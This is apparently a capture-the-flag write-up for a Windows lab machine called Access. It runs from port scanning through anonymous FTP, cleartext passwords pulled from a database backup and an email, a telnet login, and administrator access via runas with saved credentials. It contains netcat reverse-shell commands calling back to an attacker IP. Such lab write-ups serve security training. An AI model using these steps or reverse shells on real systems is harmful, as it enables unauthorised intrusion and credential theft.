## Port Scan

The initial nmap scan returns us the following.

```bash
$ sudo nmap -sS -p- -Pn 10.10.10.98 --min-rate=5000 -oN all
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 09:49 AEST
Nmap scan report for 10.10.10.98
Host is up (0.34s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

$ sudo nmap -sC -sV 10.10.10.98 -Pn -p21,23,80         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 09:52 AEST
Nmap scan report for 10.10.10.98
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can\'t get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see the following services are running on the machine:

1. `21`: Microsoft ftpd FTP server
2. `23`: Telnet
3. `80`: Microsoft IIS HTTP server

## Webserver

When we visit the webserver on port 80, we are greeted with a static image and the page source does not give ua any important information either.

A quick directory scan of the endpoint also leaves us with nothing.

```bash
$ gobuster dir -u http://10.10.10.98 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.98
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

## FTP Server

Since we had no luck with the webserver, we move our attention to the FTP server available on the machine. From the initial nmap scan we identified that anonymous login is enabled on the server.

```bash
$ ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
```

### File Download

There seems to be 2 directories available to us and if we look inside them we see a backup file and another file named `Access Control.zip`.

```bash
ftp> ls Backups
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb

ftp> ls Engineer
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip

ftp> cd Engineer
250 CWD command successful

ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************| 10870       10.60 KiB/s    00:00 ETAf

ftp> cd ../Backups
250 CWD command successful.
ftp> binary 
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|  5520 KiB   34.02 KiB/s    00:00 ETA
```

Since the `backup.mdb` file is large in size, we need to switch to `binary` mode to download it without any connection issues.

### File Access

The backup files seems to be from a `MarinaDB` database based on the extension. We can use the `mdb` tools on kali to inspect the file.

```bash
 mdb-schema backup.mdb | grep pass*
        [password]                      Text (50), 
        [mverifypass]                   Text (10),

$ mdb-schema backup.mdb > schema.txt
```

Upon inspection, we see there are some passwords stored in the database, any by going through the schema we identify these passwords are stored in the `auth_user` table.

```SQL
CREATE TABLE [auth_user]
 (
	[id]			Long Integer, 
	[username]			Text (50), 
	[password]			Text (50), 
	[Status]			Long Integer, 
	[last_login]			DateTime, 
	[RoleID]			Long Integer, 
	[Remark]			Memo/Hyperlink (255)
);

$ mdb-sql backup.mdb 
1 => SELECT id, username, password from auth_user;

+-----------+-------------+------------------+
|id         |username     |password          |
+-----------+-------------+------------------+
|25         |admin        |admin             |
|27         |engineer     |access4u@security |
|28         |backup_admin |admin             |
+-----------+-------------+------------------+
3 Rows retrieved
```

We are able to extract several cleartext passwords from the database that might belong to important users of the system. Next, we can try to look into the zip file we downloaded.

When we try to unzip the file, we are prompted to enter a password. The `access4u@security` enables us to unzip and extract the `mail.pst` file inside.

![[Access_unzip.png]]

The `.pst` stands for Personal Storage Table, a proprietary file format used by MS Outlook to store copies of emails, etc. We can use a tool like `pst-utils` to convert this to a readable format like `.mbox`.

```bash
$ mv Access\ Control.pst mail.pst
$ readpst mail.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.

$ ls -l
total 5860
-rw-rw-r-- 1 kali kali   10870 Jul 14 09:53 'Access Control.zip'
-rw-r--r-- 1 root root     404 Jul 14 09:50  all
-rw-rw-r-- 1 kali kali 5652480 Aug 24  2018  backup.mdb
-rw-rw-r-- 1 kali kali    3112 Jul 14 10:26  mail.mbox
-rw-rw-r-- 1 kali kali  271360 Aug 24  2018  mail.pst
-rw-rw-r-- 1 kali kali   49379 Jul 14 10:19  schema.txt
```

Inside the `mail.mbox` file, we find the following content.

```text
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```


## Telnet

Once we are done with the files, we can now move on to the Telnet server on port `23`. 

```bash
$ telnet 10.10.10.98 23
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

The credentials we extracted from the email, gives us access to the machine through the Telnet service.

Even though we gained access, it seems like the user we compromised cannot run any executables on the machine. I tried uploading a `nc.exe` and use it to gain a more stable shell, but it fails. Same with winPEAS as well.

```PowerShell
C:\Users\security\Desktop>nc.exe 10.10.14.19 6666 -e cmd
This program is blocked by group policy. For more information, contact your system administrator.

C:\Users\security\Desktop>win.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

## RunAs

When we check stored credentials on the machine, we notice there is a set of credentials stored for the Administrator. ^RunAs

```PowerShell
C:\Users\security\Desktop>cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Since we have a set of stored credentials, we can try to use the `runas.exe` to execute commands as the administrator.

```PowerShell
C:\Users>cd Administrator
Access is denied.

C:\Users>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

C:\Users\>cd security

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

07/14/2025  01:43 AM    <DIR>          .
07/14/2025  01:43 AM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
08/21/2018  11:35 PM    <DIR>          Contacts
07/14/2025  01:38 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
08/21/2018  11:35 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
07/14/2025  01:43 AM                34 root.txt
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
               1 File(s)             34 bytes
              14 Dir(s)   3,316,953,088 bytes free
```

## PWNED

We have successfully access a file in the `Administrator` directory with the stored credentials. We can even go further and use the `nc.exe` executable transferred previously to gain a rev shell as administrator.

```PowerShell
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\Desktop\nc.exe 10.10.14.19 6666 -e cmd"
```

```bash
$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.98] 49163
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```

